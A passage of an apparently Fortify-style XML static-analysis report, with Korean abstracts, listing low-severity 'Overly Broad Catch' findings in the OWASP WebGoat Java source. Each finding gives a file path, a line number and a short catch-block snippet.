                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Login.java 줄 255의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>255</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employees");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9C573AD37AC4F2A01014A23E4ADBC2EB" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ThreadSafetyProblem.java 줄 125의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>125</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BCEB93E3F660C12BFB6E4E3997560F66" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java 줄 203의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>203</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="984E5F526523991AAC57FE2EB26CA793" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ReflectedXSS.java 줄 219의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>219</LineStart>
<Snippet>	    ec.addElement(new HR().setWidth("90%"));
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="20367431E7F8E26A17FE6BF64C1E276F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>FailOpenAuthentication.java 줄 120의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>120</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F9974EE8EC9C5E179F76029FA785B512" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AbstractLesson.java 줄 903의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>903</LineStart>
<Snippet>		    false));
	}
	catch (Exception e)
	{
	    s.setMessage("Couldn't read HTTP request");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="95305C2FB8B376A1BAE2E30F8CB39C3A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BlindSqlInjection.java 줄 142의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>142</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="161A3C0DD6C36778637931D9C7360ECF" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>FindProfile.java 줄 216의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>216</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error finding employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CB094AD5FC328713B7A53060674B2FD6" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WsSqlInjection.java 줄 246의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    {}
	}
	catch (Exception e)
	{}
	return null;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4FE0BE01618542AC048D5D2F29660F0E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>PathBasedAccessControl.java 줄 214의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>214</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BC8647CB9B226FE34C83F775142C45C5" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpOnly.java 줄 135의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>135</LineStart>
<Snippet>			ec.addElement(makeContent(s));
		}
		catch ( Exception e )
		{
			s.setMessage( "Error generating " + this.getClass().getName() );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="300D602DF2E3D166982F55C07DEE6D12" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 185의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>185</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error updating employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D620F026E15344731176C0B3215BC472" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SqlNumericInjection.java 줄 398의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>398</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A6464CC9E6215BB25259B213F6CFDDE0" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 521의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>521</LineStart>
<Snippet>	    return getLongParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CF594E0CF79B7C3FA87FBD348CC03AA7" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>EditProfile.java 줄 128의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>128</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4B71BE263D2C30F4382BA95ABABD7167" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SqlStringInjection.java 줄 314의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>314</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="29C463E05D17C443C05EB197B4AD6F18" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 428의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>428</LineStart>
<Snippet>			}
		    }
		    catch (Exception e)
		    {
			valid = false;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="ECB1D7A86EAC9FB582841881E6E71F93" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 1010의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>1010</LineStart>
<Snippet>			return new String( xor( decoded, userKey ) );
		}
		catch ( Exception e )
		{
			return "String not XOR encoded.";</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AF7F2EF4AE486291468997DEAB8B7089" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java 줄 194의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>194</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1DCEFC1AF9A28D90A07A21857D423261" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AbstractLesson.java 줄 1042의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1042</LineStart>
<Snippet>	    reader.close();
	}
	catch (Exception e)
	{
	    System.out.println(e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3F64B43C4AC4C83E664764AFDEE9CFDE" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ThreadSafetyProblem.java 줄 214의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>214</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="76EB0FFF299797C5585CEE9AE40C0639" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java 줄 261의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>261</LineStart>
<Snippet>	    //            accessWGService("WSDLScanning", "getCreditCard", "acct_num", new Integer(101));
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DD7385386D83E879B6909F5046F2076E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>FindProfile.java 줄 184의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error finding employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D8F6A57AFFB224274D67BEAAC783FD9B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>CSRF.java 줄 199의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>199</LineStart>
<Snippet>			}
		}
		catch ( Exception e )
		{
			s.setMessage( "Error while getting message list." );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C2500FB1E8426400AEEF72456022E47E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 888의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>888</LineStart>
<Snippet>			return ( cbuf.toString() );
		}
		catch ( Exception e )
		{
			return ( "Encoding problem" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4D8304A765717F80C3133D7426A70265" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java 줄 270의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>270</LineStart>
<Snippet>	    // ec.addElement( new P().addElement( pnfe.getMessage() ) );
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C7D1EB1ADCB567D23DD9F023A71DB3F2" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java 줄 293의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>293</LineStart>
<Snippet>	    {}
	}
	catch (Exception e)
	{}
	return null;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D04E1D780C872C137C59ECCF6156AD5F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 223의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>223</LineStart>
<Snippet>	    return getCharParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5F5F0A755A3B03410C7BDF0188445C5C" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>CSRF.java 줄 100의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>100</LineStart>
<Snippet>			statement.executeQuery();
		}
		catch ( Exception e )
		{
			// ignore the empty resultset on the insert.  There are a few more SQL Injection errors</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CF048E88905EF9415D39C94C16B59D71" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>RefreshDBScreen.java 줄 165의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RefreshDBScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/RefreshDBScreen.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	    System.out.println("Successfully refreshed the database.");
	}
	catch (Exception e)
	{
	    s.setMessage("Error refreshing database "</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A7BD3B00DCB3D00E5497B3C4ACFBC6F8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SqlNumericInjection.java 줄 239의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>239</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4A988E6CCF0F7F51B41D9977BDEEAFC9" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java 줄 391의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>391</LineStart>
<Snippet>	    lessonProperties.store(out, s.getUserName());
	}
	catch (Exception e)
	{
	    // what do we want to do,  I think nothing.</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D489E6517AF3169DA7E6B8EBC1FAACBB" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BlindSqlInjection.java 줄 341의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>341</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C8E63DD60CAF71B149D1A2AA42467FA8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SilentTransactions.java 줄 115의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SilentTransactions.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SilentTransactions.java</FilePath>
<LineStart>115</LineStart>
<Snippet>	    }
	}
	catch (Exception ex)
	{
	    ex.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D81216C32FEB194871179B1432869592" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>StoredXss.java 줄 110의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>110</LineStart>
<Snippet>	    statement.executeQuery();
	}
	catch (Exception e)
	{
